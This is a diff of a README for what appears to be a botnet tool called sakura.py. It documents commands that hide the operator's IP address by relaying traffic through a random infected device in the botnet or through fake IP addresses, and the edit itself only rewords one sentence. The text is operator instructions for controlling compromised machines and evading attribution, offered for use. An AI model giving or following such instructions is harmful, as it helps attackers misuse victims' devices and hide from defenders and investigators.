@@ -32,6 +32,6 @@ Run: `python3 sakura.py`
 Communicate with your botnet through random device from this botnet! 
 ### Setting up
 Open [sakura terminal](#as-terminal) and type `.proxy random`. Later you can disable it by anoter command: `.proxy disable`. Check status by command `.proxy status`.
-This will help hide your IP address by showing the IP of a random device.
+This will help hide your IP address by showing the IP of a random device from ur botnet.
 ### Anoter way
 You can hide behind fake IP addresses. For this, use `.proxy fake`
